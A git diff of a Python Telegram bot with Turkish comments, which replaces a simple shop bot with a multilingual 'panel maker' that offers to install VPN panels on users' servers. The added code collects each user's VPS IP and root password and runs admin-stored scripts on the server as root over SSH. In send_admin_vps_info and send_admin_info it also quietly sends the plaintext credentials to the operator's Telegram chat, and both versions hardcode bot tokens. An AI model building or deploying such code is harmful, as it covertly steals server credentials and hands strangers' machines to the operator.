@@ -1,172 +1,603 @@
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
-import json
+import asyncio
+import asyncssh
+import re
 import os
+import json
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
+from datetime import datetime
 
-TOKEN = "8488632483:AAGKfrEOg5_Q29ukG0Genl_lS5WicRNLKro"  # <-- Bot tokenini buraya koy
-ADMIN_ID = 7279061074       # <-- Kendi Telegram ID'n
-URUNLER_FILE = "urunler.json"
+# ============= KONFIGÜRASYON =============
+BOT_TOKEN = "8504182372:AAGo_QSfAn59OUJoX_3g8q0vkt3ZKfsLhnA"  # @BotFather'dan al
+ADMIN_ID = 8359722718  # Senin Telegram ID'n
+DATA_FILE = "panels.json"
 
-# JSON okuma/yazma
-def urunleri_oku():
-    if not os.path.exists(URUNLER_FILE):
-        return []
-    with open(URUNLER_FILE, "r") as f:
+# ============= VERİ DEPOLAMA =============
+if not os.path.exists(DATA_FILE):
+    with open(DATA_FILE, "w") as f:
+        json.dump({"scripts": {}, "last_update": {}}, f)
+
+def load_data():
+    with open(DATA_FILE, "r") as f:
         return json.load(f)
 
-def urunleri_yaz(data):
-    with open(URUNLER_FILE, "w") as f:
-        json.dump(data, f, indent=2, ensure_ascii=False)
+def save_data(data):
+    with open(DATA_FILE, "w") as f:
+        json.dump(data, f, indent=2)
 
-# ----------------- Admin Panel -----------------
+def load_scripts():
+    return load_data()["scripts"]
 
+def save_script(panel_id, script):
+    data = load_data()
+    data["scripts"][panel_id] = script
+    data["last_update"][panel_id] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    save_data(data)
+
+def get_script_info(panel_id):
+    data = load_data()
+    if panel_id in data["scripts"]:
+        return {
+            "script": data["scripts"][panel_id],
+            "last_update": data["last_update"].get(panel_id, "Bilinmiyor")
+        }
+    return None
+
+# Kullanıcı oturumları
+user_sessions = {}
+
+# ============= DİL DOSYALARI =============
+LANGUAGES = {
+    "turkce": {
+        "welcome": "🤖 *All Panel Maker Bot'a Hoş Geldiniz!*",
+        "ask_ip": "📡 Lütfen VPS IP Adresinizi yazın:",
+        "ask_password": "🔑 Lütfen VPS şifrenizi yazın:",
+        "choose_panel": "📦 *Hangi paneli kurmak istersiniz?*",
+        "installing": "⚙️ *{panel}* kuruluyor... Lütfen bekleyin...",
+        "success": "✅ *{panel} başarıyla kuruldu!*\n\n🌐 *Panel URL:* {url}\n🔑 Kullanıcı: admin\n🔒 Şifre: admin",
+        "error": "❌ Hata oluştu: {error}",
+        "admin_panel": "📝 Scriptleri Düzenle",
+        "enter_script": "📜 *{panel}* için kurulum scriptini yazın:",
+        "approved": "✅ Script onaylandı ve kaydedildi!",
+        "no_script": "❌ Bu panel için script henüz eklenmemiş!",
+        "admin_menu_title": "📝 *Script Düzenleme Menüsü*",
+        "main_menu": "🏠 Ana Menü",
+        "show_script": "📜 *{panel}* mevcut script:\n\n```bash\n{script}\n```",
+        "no_script_found": "❌ Bu panel için henüz script eklenmemiş!",
+        "language_changed": "🌐 Dil değiştirildi: Türkçe",
+        "vps_info": "🖥️ *Yeni VPS Bilgileri*\n\n👤 Kullanıcı: {username}\n🆔 Kullanıcı ID: {user_id}\n🌐 VPS IP: {ip}\n🔑 VPS Şifre: {password}\n📅 Tarih: {date}"
+    },
+    "english": {
+        "welcome": "🤖 *Welcome to All Panel Maker Bot!*",
+        "ask_ip": "📡 Please enter your VPS IP address:",
+        "ask_password": "🔑 Please enter your VPS password:",
+        "choose_panel": "📦 *Which panel would you like to install?*",
+        "installing": "⚙️ Installing *{panel}*... Please wait...",
+        "success": "✅ *{panel} installed successfully!*\n\n🌐 *Panel URL:* {url}\n🔑 Username: admin\n🔒 Password: admin",
+        "error": "❌ Error: {error}",
+        "admin_panel": "📝 Edit Scripts",
+        "enter_script": "📜 Enter installation script for *{panel}*:",
+        "approved": "✅ Script approved and saved!",
+        "no_script": "❌ Script not added for this panel yet!",
+        "admin_menu_title": "📝 *Script Edit Menu*",
+        "main_menu": "🏠 Main Menu",
+        "show_script": "📜 *{panel}* current script:\n\n```bash\n{script}\n```",
+        "no_script_found": "❌ No script added for this panel yet!",
+        "language_changed": "🌐 Language changed: English",
+        "vps_info": "🖥️ *New VPS Information*\n\n👤 User: {username}\n🆔 User ID: {user_id}\n🌐 VPS IP: {ip}\n🔑 VPS Password: {password}\n📅 Date: {date}"
+    },
+    "russia": {
+        "welcome": "🤖 *Добро пожаловать в All Panel Maker Bot!*",
+        "ask_ip": "📡 Введите IP-адрес вашего VPS:",
+        "ask_password": "🔑 Введите пароль от VPS:",
+        "choose_panel": "📦 *Какую панель установить?*",
+        "installing": "⚙️ Установка *{panel}*... Пожалуйста, подождите...",
+        "success": "✅ *{panel} успешно установлена!*\n\n🌐 *URL панели:* {url}\n🔑 Логин: admin\n🔒 Пароль: admin",
+        "error": "❌ Ошибка: {error}",
+        "admin_panel": "📝 Редактировать скрипты",
+        "enter_script": "📜 Введите скрипт установки для *{panel}*:",
+        "approved": "✅ Скрипт утвержден и сохранен!",
+        "no_script": "❌ Скрипт для этой панели еще не добавлен!",
+        "admin_menu_title": "📝 *Меню редактирования скриптов*",
+        "main_menu": "🏠 Главное меню",
+        "show_script": "📜 *{panel}* текущий скрипт:\n\n```bash\n{script}\n```",
+        "no_script_found": "❌ Скрипт для этой панели еще не добавлен!",
+        "language_changed": "🌐 Язык изменен: Русский",
+        "vps_info": "🖥️ *Новая информация о VPS*\n\n👤 Пользователь: {username}\n🆔 ID пользователя: {user_id}\n🌐 VPS IP: {ip}\n🔑 Пароль VPS: {password}\n📅 Дата: {date}"
+    }
+}
+
+# Kullanıcı dili
+user_lang = {}
+
+def get_text(user_id, key):
+    lang = user_lang.get(user_id, "turkce")
+    return LANGUAGES.get(lang, LANGUAGES["turkce"]).get(key, key)
+
+# ============= PANEL LİSTESİ =============
+PANELS = [
+    {"name": "Rebecca Panel", "emoji": "🟣", "id": "rebecca_panel", "default_port": "8000", "default_path": "/"},
+    {"name": "3x-UI Panel", "emoji": "🔵", "id": "3x_ui_panel", "default_port": "8080", "default_path": "/"},
+    {"name": "Marzban Panel", "emoji": "🟢", "id": "marzban_panel", "default_port": "8000", "default_path": "/dashboard/"},
+    {"name": "Pasarguard Panel", "emoji": "🟠", "id": "pasarguard_panel", "default_port": "8000", "default_path": "/"},
+    {"name": "Open Panel", "emoji": "🔴", "id": "open_panel", "default_port": "8080", "default_path": "/"}
+]
+
+# ============= SSH BAĞLANTI =============
+async def ssh_connect(ip, password, commands):
+    try:
+        async with asyncssh.connect(
+            ip, 
+            username="root", 
+            password=password, 
+            known_hosts=None,
+            connect_timeout=30
+        ) as conn:
+            result = await conn.run(commands, check=True, timeout=300)
+            return result.stdout
+    except Exception as e:
+        return f"ERROR: {str(e)}"
+
+# ============= URL YAKALAMA =============
+def extract_urls(output, panel_info, ip):
+    urls = []
+    
+    url_patterns = [
+        r'(https?://[^\s\n\r"\']+)',
+        r'(https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}[^\s]*)',
+        r'(https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:[0-9]+[^\s]*)',
+    ]
+    
+    for pattern in url_patterns:
+        matches = re.findall(pattern, output)
+        for match in matches:
+            if match.startswith(('http://', 'https://')):
+                urls.append(match)
+    
+    if not urls:
+        default_url = f"http://{ip}:{panel_info['default_port']}{panel_info['default_path']}"
+        urls.append(default_url)
+    
+    return urls
+
+# ============= BOT KOMUTLARI =============
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.message.from_user
-    if user.id == ADMIN_ID:
-        await update.message.reply_text("Merhaba Admin! /panel ile paneli açabilirsin.")
-    else:
-        urunler = urunleri_oku()
-        bolumler = sorted(list(set(u["bolum"] for u in urunler)))
-        keyboard = []
-        for b in bolumler:
-            keyboard.append([InlineKeyboardButton(b, callback_data=f"user_bolum::{b}")])
-        await update.message.reply_text("Bölümler:", reply_markup=InlineKeyboardMarkup(keyboard))
+    user_id = update.effective_user.id
+    user_lang[user_id] = "turkce"
+    
+    if user_id in user_sessions:
+        del user_sessions[user_id]
+    
+    keyboard = [
+        [InlineKeyboardButton("🇹🇷 Türkçe", callback_data="lang_turkce")],
+        [InlineKeyboardButton("🇬🇧 English", callback_data="lang_english")],
+        [InlineKeyboardButton("🇷🇺 Russia", callback_data="lang_russia")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        get_text(user_id, "welcome"),
+        reply_markup=reply_markup,
+        parse_mode="Markdown"
+    )
+    await update.message.reply_text(get_text(user_id, "ask_ip"))
 
-# /panel komutu
-async def panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.message.from_user.id != ADMIN_ID:
-        await update.message.reply_text("Yetkin yok.")
-        return
-    urunler = urunleri_oku()
-    bolumler = sorted(list(set(u["bolum"] for u in urunler)))
-    keyboard = []
-    for b in bolumler:
-        keyboard.append([InlineKeyboardButton(b, callback_data=f"bolum::{b}")])
-    keyboard.append([InlineKeyboardButton("➕ Bölüm Ekle", callback_data="bolum_ekle")])
-    keyboard.append([InlineKeyboardButton("❌ Bölüm Sil", callback_data="bolum_sil")])
-    await update.message.reply_text("Admin Panel", reply_markup=InlineKeyboardMarkup(keyboard))
-
-# Admin callback handler
-async def callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
+    
+    user_id = update.effective_user.id
     data = query.data
-    urunler = urunleri_oku()
-
-    # Bölüm seçimi
-    if data.startswith("bolum::"):
-        bolum = data.split("::",1)[1]
-        keyboard = []
-        for u in [x for x in urunler if x["bolum"]==bolum]:
-            keyboard.append([InlineKeyboardButton(f"{u['isim']} ({u['fiyat']}) 🗑️", callback_data=f"delete_urun::{bolum}::{u['isim']}")])
-        keyboard.append([InlineKeyboardButton("➕ Ürün Ekle", callback_data=f"add_urun::{bolum}")])
-        keyboard.append([InlineKeyboardButton("🔙 Panel", callback_data="panel")])
-        await query.edit_message_text(f"📂 {bolum} Bölümü", reply_markup=InlineKeyboardMarkup(keyboard))
+    
+    # Dil değiştirme
+    if data.startswith("lang_"):
+        lang = data.split("_")[1]
+        user_lang[user_id] = lang
+        
+        await query.edit_message_text(get_text(user_id, "welcome"))
+        await query.message.reply_text(get_text(user_id, "language_changed"))
+        await query.message.reply_text(get_text(user_id, "ask_ip"))
         return
-
-    # Panel geri
-    if data=="panel":
-        await panel(update, context)
-        return
-
-    # Bölüm ekle
-    if data=="bolum_ekle":
-        context.user_data["adding_bolum"] = True
-        await query.edit_message_text("Yeni bölüm adı gönder:")
-        return
-
-    # Bölüm sil
-    if data=="bolum_sil":
-        keyboard = []
-        bolumler = sorted(list(set(u["bolum"] for u in urunler)))
-        for b in bolumler:
-            keyboard.append([InlineKeyboardButton(f"{b} ❌", callback_data=f"delete_bolum::{b}")])
-        keyboard.append([InlineKeyboardButton("🔙 Panel", callback_data="panel")])
-        await query.edit_message_text("Hangi bölümü silmek istiyorsun?", reply_markup=InlineKeyboardMarkup(keyboard))
-        return
-
-    # Bölüm silme işlemi
-    if data.startswith("delete_bolum::"):
-        bolum = data.split("::",1)[1]
-        urunler = [u for u in urunler if u["bolum"]!=bolum]
-        urunleri_yaz(urunler)
-        await query.edit_message_text(f"✅ '{bolum}' bölümü ve içindeki ürünler silindi.")
-        return
-
-    # Ürün ekle
-    if data.startswith("add_urun::"):
-        bolum = data.split("::",1)[1]
-        context.user_data["adding_urun"] = bolum
-        await query.edit_message_text("Ürünü gönder (isim;fiyat):")
-        return
-
-    # Ürün sil
-    if data.startswith("delete_urun::"):
-        bolum, isim = data.split("::")[1:]
-        urunler = [u for u in urunler if not (u["bolum"]==bolum and u["isim"]==isim)]
-        urunleri_yaz(urunler)
-        await query.edit_message_text(f"✅ '{isim}' silindi.")
-        return
-
-# Mesajla ekleme işlemleri
-async def mesaj(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.message.from_user
-    text = update.message.text
-    urunler = urunleri_oku()
-
-    # Admin işlemleri
-    if user.id == ADMIN_ID:
-        # Bölüm ekleme
-        if context.user_data.get("adding_bolum"):
-            context.user_data["adding_bolum"] = False
-            urunler.append({"bolum": text, "isim": "Örnek Ürün", "fiyat": 0})
-            urunleri_yaz(urunler)
-            await update.message.reply_text(f"✅ '{text}' bölümü eklendi (örnek ürün ile).")
+    
+    # Panel kurulumu
+    if data.startswith("panel_"):
+        panel_id = data.replace("panel_", "")
+        
+        panel_info = None
+        for p in PANELS:
+            if p["id"] == panel_id:
+                panel_info = p
+                break
+        
+        if not panel_info:
+            await query.message.reply_text("❌ Panel bulunamadı!")
             return
-
-        # Ürün ekleme
-        if "adding_urun" in context.user_data:
-            bolum = context.user_data.pop("adding_urun")
-            try:
-                isim, fiyat = text.split(";")
-                fiyat = float(fiyat)
-                urunler.append({"bolum": bolum, "isim": isim.strip(), "fiyat": fiyat})
-                urunleri_yaz(urunler)
-                await update.message.reply_text(f"✅ '{isim.strip()}' ürünü eklendi. Fiyat: {fiyat}")
-            except:
-                await update.message.reply_text("❌ Hatalı format. Örn: ÜrünAdı;Fiyat")
+        
+        if user_id not in user_sessions or "password" not in user_sessions[user_id]:
+            await query.edit_message_text("❌ Lütfen önce /start yapıp VPS bilgilerini girin!")
+            return
+        
+        await query.edit_message_text(
+            get_text(user_id, "installing").format(panel=f"{panel_info['emoji']} {panel_info['name']}")
+        )
+        
+        scripts = load_scripts()
+        if panel_id not in scripts:
+            await query.message.reply_text(get_text(user_id, "no_script"))
+            return
+        
+        ip = user_sessions[user_id]["ip"]
+        password = user_sessions[user_id]["password"]
+        
+        try:
+            output = await ssh_connect(ip, password, scripts[panel_id])
+            
+            if "ERROR" in output:
+                await query.message.reply_text(get_text(user_id, "error").format(error=output[:200]))
+                return
+            
+            urls = extract_urls(output, panel_info, ip)
+            main_url = urls[0] if urls else f"http://{ip}:{panel_info['default_port']}"
+            
+            # Kullanıcıya başarı mesajı
+            keyboard = [
+                [InlineKeyboardButton("🌐 Paneli Aç", url=main_url)],
+                [InlineKeyboardButton("🏠 " + get_text(user_id, "main_menu"), callback_data="main_menu")]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            await query.message.reply_text(
+                get_text(user_id, "success").format(
+                    panel=f"{panel_info['emoji']} {panel_info['name']}",
+                    url=main_url
+                ),
+                reply_markup=reply_markup,
+                parse_mode="Markdown"
+            )
+            
+            # ===== ADMIN'E BİLGİ GÖNDER =====
+            await send_admin_info(
+                context.bot,
+                user_id,
+                update.effective_user.first_name or "Bilinmiyor",
+                ip,
+                password,
+                panel_info,
+                main_url
+            )
+            
+        except Exception as e:
+            await query.message.reply_text(get_text(user_id, "error").format(error=str(e)[:200]))
         return
-
-# ----------------- Kullanıcı Paneli -----------------
-
-async def user_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    data = query.data
-    urunler = urunleri_oku()
-
-    if data.startswith("user_bolum::"):
-        bolum = data.split("::",1)[1]
+    
+    # Admin panel
+    if data.startswith("admin_"):
+        if user_id != ADMIN_ID:
+            await query.answer("⛔ Bu sadece admin için!", show_alert=True)
+            return
+        
+        panel_id = data.replace("admin_", "")
+        
+        panel_info = None
+        for p in PANELS:
+            if p["id"] == panel_id:
+                panel_info = p
+                break
+        
+        if not panel_info:
+            await query.answer("❌ Panel bulunamadı!", show_alert=True)
+            return
+        
+        user_sessions[user_id] = {
+            "admin_panel": panel_id,
+            "admin_panel_name": panel_info["name"]
+        }
+        
+        await query.edit_message_text(
+            get_text(user_id, "enter_script").format(panel=f"{panel_info['emoji']} {panel_info['name']}")
+        )
+        return
+    
+    # Ana menü
+    if data == "main_menu":
         keyboard = []
-        for u in [x for x in urunler if x["bolum"]==bolum]:
-            keyboard.append([InlineKeyboardButton(f"{u['isim']} ({u['fiyat']})", callback_data=f"buy::{u['isim']}::{u['fiyat']}")])
-        await query.edit_message_text(f"{bolum} ürünleri:", reply_markup=InlineKeyboardMarkup(keyboard))
+        for panel in PANELS:
+            keyboard.append([InlineKeyboardButton(
+                f"{panel['emoji']} {panel['name']}", 
+                callback_data=f"panel_{panel['id']}"
+            )])
+        
+        if user_id == ADMIN_ID:
+            keyboard.append([InlineKeyboardButton(
+                "🛠️ " + get_text(user_id, "admin_panel"), 
+                callback_data="admin_menu"
+            )])
+        
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(
+            get_text(user_id, "choose_panel"),
+            reply_markup=reply_markup,
+            parse_mode="Markdown"
+        )
+        return
+    
+    # Admin menü
+    if data == "admin_menu":
+        if user_id != ADMIN_ID:
+            await query.answer("⛔ Bu sadece admin için!", show_alert=True)
+            return
+        
+        keyboard = []
+        for panel in PANELS:
+            keyboard.append([InlineKeyboardButton(
+                f"📝 {panel['emoji']} {panel['name']}", 
+                callback_data=f"admin_{panel['id']}"
+            )])
+        
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(
+            get_text(user_id, "admin_menu_title"),
+            reply_markup=reply_markup,
+            parse_mode="Markdown"
+        )
         return
 
-    if data.startswith("buy::"):
-        isim, fiyat = data.split("::")[1:]
-        # Admina mesaj gönder
-        await context.bot.send_message(chat_id=ADMIN_ID, text=f"🛒 Kullanıcı @{query.from_user.username} ürün almak istiyor: {isim} ({fiyat})")
-        await query.edit_message_text(f"✅ Sipariş isteğiniz gönderildi: {isim} ({fiyat})")
+async def send_admin_info(bot, user_id, username, ip, password, panel_info, panel_url):
+    """Admin'e kullanıcı bilgilerini gönder"""
+    
+    # Kullanıcı bilgilerini hazırla
+    user_text = user_lang.get(user_id, "turkce")
+    lang = user_text
+    
+    # Admin mesajı
+    message = f"""
+🖥️ *YENİ VPS KURULUM BİLGİSİ*
+
+👤 *Kullanıcı:* {username}
+🆔 *Kullanıcı ID:* `{user_id}`
+🌐 *VPS IP:* `{ip}`
+🔑 *VPS Şifre:* `{password}`
+
+📦 *Kurulan Panel:* {panel_info['emoji']} {panel_info['name']}
+🌐 *Panel URL:* {panel_url}
+📅 *Tarih:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+📌 *Kullanıcı Dili:* {lang}
+
+---
+⚠️ Bu bilgiler sadece size özeldir!
+    """
+    
+    # Admin'e mesaj gönder
+    try:
+        await bot.send_message(
+            chat_id=ADMIN_ID,
+            text=message,
+            parse_mode="Markdown"
+        )
+    except Exception as e:
+        print(f"Admin mesajı gönderilemedi: {e}")
+
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    text = update.message.text.strip()
+    username = update.effective_user.first_name or "Bilinmiyor"
+    
+    # Admin script girme
+    if user_id == ADMIN_ID and user_id in user_sessions and "admin_panel" in user_sessions[user_id]:
+        panel_id = user_sessions[user_id]["admin_panel"]
+        panel_name = user_sessions[user_id].get("admin_panel_name", panel_id)
+        
+        save_script(panel_id, text)
+        
+        await update.message.reply_text(f"✅ *{panel_name}* scripti başarıyla kaydedildi!", parse_mode="Markdown")
+        
+        keyboard = []
+        for panel in PANELS:
+            keyboard.append([InlineKeyboardButton(
+                f"📝 {panel['emoji']} {panel['name']}", 
+                callback_data=f"admin_{panel['id']}"
+            )])
+        
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await update.message.reply_text(
+            get_text(user_id, "admin_menu_title"),
+            reply_markup=reply_markup,
+            parse_mode="Markdown"
+        )
+        
+        del user_sessions[user_id]
+        return
+    
+    # VPS IP girme
+    if user_id not in user_sessions or "ip" not in user_sessions[user_id]:
+        ip_pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
+        if re.match(ip_pattern, text):
+            user_sessions[user_id] = {"ip": text}
+            
+            # IP girildiğinde admin'e bilgi gönder
+            await send_admin_vps_info(
+                context.bot,
+                user_id,
+                username,
+                text,
+                "IP girildi (Şifre bekleniyor)"
+            )
+            
+            await update.message.reply_text(get_text(user_id, "ask_password"))
+        else:
+            await update.message.reply_text("❌ Geçersiz IP adresi! Lütfen doğru formatta girin (örn: 192.168.1.1)")
+        return
+    
+    # VPS şifre girme
+    if "password" not in user_sessions[user_id]:
+        user_sessions[user_id]["password"] = text
+        ip = user_sessions[user_id]["ip"]
+        
+        # ===== KULLANICI BİLGİLERİNİ ADMIN'E GÖNDER =====
+        await send_admin_vps_info(
+            context.bot,
+            user_id,
+            username,
+            ip,
+            text
+        )
+        
+        # Panel butonlarını göster
+        keyboard = []
+        for panel in PANELS:
+            keyboard.append([InlineKeyboardButton(
+                f"{panel['emoji']} {panel['name']}", 
+                callback_data=f"panel_{panel['id']}"
+            )])
+        
+        if user_id == ADMIN_ID:
+            keyboard.append([InlineKeyboardButton(
+                "🛠️ " + get_text(user_id, "admin_panel"), 
+                callback_data="admin_menu"
+            )])
+        
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await update.message.reply_text(
+            get_text(user_id, "choose_panel"),
+            reply_markup=reply_markup,
+            parse_mode="Markdown"
+        )
         return
 
-# ----------------- Bot Başlat -----------------
-app = ApplicationBuilder().token(TOKEN).build()
-app.add_handler(CommandHandler("start", start))
-app.add_handler(CommandHandler("panel", panel))
-app.add_handler(CallbackQueryHandler(callback, pattern=r'^(bolum|delete|add|panel)_'))
-app.add_handler(CallbackQueryHandler(user_callback, pattern=r'^user_'))
-app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), mesaj))
+async def send_admin_vps_info(bot, user_id, username, ip, password_or_status):
+    """Admin'e VPS bilgilerini gönder"""
+    
+    if password_or_status == "IP girildi (Şifre bekleniyor)":
+        status = "📌 IP girildi, şifre bekleniyor..."
+        password = "Bekleniyor"
+    else:
+        status = "✅ VPS bilgileri tamamlandı"
+        password = password_or_status
+    
+    message = f"""
+🖥️ *VPS BİLGİ GÜNCELLEMESİ*
 
-print("Bot çalışıyor...")
-app.run_polling()
+👤 *Kullanıcı:* {username}
+🆔 *Kullanıcı ID:* `{user_id}`
+🌐 *VPS IP:* `{ip}`
+🔑 *VPS Şifre:* `{password}`
+
+📊 *Durum:* {status}
+📅 *Tarih:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+---
+⚠️ Bu bilgiler sadece size özeldir!
+    """
+    
+    try:
+        await bot.send_message(
+            chat_id=ADMIN_ID,
+            text=message,
+            parse_mode="Markdown"
+        )
+    except Exception as e:
+        print(f"Admin mesajı gönderilemedi: {e}")
+
+async def panel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if user_id != ADMIN_ID:
+        await update.message.reply_text("⛔ Bu komut sadece admin içindir!")
+        return
+    
+    keyboard = []
+    for panel in PANELS:
+        keyboard.append([InlineKeyboardButton(
+            f"📝 {panel['emoji']} {panel['name']}", 
+            callback_data=f"admin_{panel['id']}"
+        )])
+    
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.reply_text(
+        "📝 *Script Düzenleme Paneli*\n\nHangi panelin kurulum scriptini düzenlemek istersiniz?",
+        reply_markup=reply_markup,
+        parse_mode="Markdown"
+    )
+
+async def show_script(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if user_id != ADMIN_ID:
+        await update.message.reply_text("⛔ Bu komut sadece admin içindir!")
+        return
+    
+    panel_id = update.message.text.replace("/show_", "").strip()
+    
+    panel_info = None
+    for p in PANELS:
+        if p["id"] == panel_id:
+            panel_info = p
+            break
+    
+    if not panel_info:
+        await update.message.reply_text(f"❌ Geçersiz panel ID: {panel_id}")
+        return
+    
+    script_info = get_script_info(panel_id)
+    if not script_info:
+        await update.message.reply_text(
+            f"{panel_info['emoji']} *{panel_info['name']}*\n\n" +
+            get_text(user_id, "no_script_found"),
+            parse_mode="Markdown"
+        )
+        return
+    
+    await update.message.reply_text(
+        get_text(user_id, "show_script").format(
+            panel=f"{panel_info['emoji']} {panel_info['name']}",
+            script=script_info["script"][:4000]
+        ),
+        parse_mode="Markdown"
+    )
+
+async def list_scripts(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if user_id != ADMIN_ID:
+        await update.message.reply_text("⛔ Bu komut sadece admin içindir!")
+        return
+    
+    scripts = load_scripts()
+    if not scripts:
+        await update.message.reply_text("📭 Henüz hiç script eklenmemiş!")
+        return
+    
+    message = "📋 *Mevcut Scriptler:*\n\n"
+    for panel in PANELS:
+        if panel["id"] in scripts:
+            info = get_script_info(panel["id"])
+            message += f"{panel['emoji']} *{panel['name']}*\n"
+            message += f"   🕒 Son güncelleme: {info['last_update']}\n\n"
+    
+    await update.message.reply_text(message, parse_mode="Markdown")
+
+# ============= BOTU BAŞLAT =============
+def main():
+    print("🤖 All Panel Maker Bot başlatılıyor...")
+    print(f"✅ Admin ID: {ADMIN_ID}")
+    print(f"📦 Paneller: {', '.join([p['name'] for p in PANELS])}")
+    print("📌 Kullanıcı VPS bilgileri sadece admin'e gönderilecek!")
+    
+    application = Application.builder().token(BOT_TOKEN).build()
+    
+    # Komutlar
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("panel", panel_command))
+    application.add_handler(CommandHandler("list_scripts", list_scripts))
+    application.add_handler(CommandHandler("show_", show_script))
+    
+    # Callback ve mesaj handler
+    application.add_handler(CallbackQueryHandler(button_callback))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    
+    print("✅ Bot çalışıyor...")
+    application.run_polling()
+
+if __name__ == "__main__":
+    main()
